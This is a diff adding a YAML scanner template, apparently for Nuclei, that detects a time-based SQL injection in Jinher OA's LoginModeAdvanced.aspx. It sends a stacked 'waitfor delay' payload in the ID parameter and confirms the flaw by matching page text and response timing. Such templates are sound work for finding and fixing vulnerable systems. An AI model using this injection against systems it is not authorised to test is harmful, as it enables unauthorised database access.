@@ -1,0 +1,36 @@
+id: jinher-loginmodeadvanced-sqli
+info:
+  name: "Jinher OA LoginModeAdvanced.aspx SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Jinher OA
+  description: |
+    Jinher OA LoginModeAdvanced.aspx is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL queries.
+
+http:
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.AddMenu/LoginModeAdvanced.aspx/?ID=1;waitfor+delay'0:0:5' HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /c6/Jhsoft.Web.AddMenu/LoginModeAdvanced.aspx/?ID=1;waitfor+delay'0:0:8' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "传统模式设置"
+          - "登录图片设置"
+          - "背景设置"
+          - "JHSoft"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
